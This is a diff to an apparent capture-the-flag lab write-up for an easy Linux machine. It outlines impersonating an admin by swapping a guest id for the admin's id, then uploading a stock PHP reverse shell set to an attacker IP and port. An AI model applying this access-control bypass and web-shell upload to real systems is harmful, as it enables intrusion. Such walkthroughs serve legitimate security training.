@@ -7,7 +7,7 @@
 # Intro
 | Dificulty | OS | Start Date | End Date | 
 |---|---|---|---|
-| Very Easy | Linux | 03/06/2022 | 03/06/2022 |
+| Very Easy | Linux | 03/06/2022 | 05/06/2022 |
 
 
 # Process
@@ -33,7 +33,7 @@ Found that admin was id=34322 so change the Guest id to simulate he's the admin.
 
 # Reverse Shell
 Located in `/usr/share/webshells/php/php-reverse-shell.php`
-Change port and ip. Upload the file. Dirbust the site again to find `.php`.
+Change port and ip and then upload the file.
 ```bash
 $ip = '10.10.15.56';  // CHANGE THIS
 $port = 1234;       // CHANGE THIS
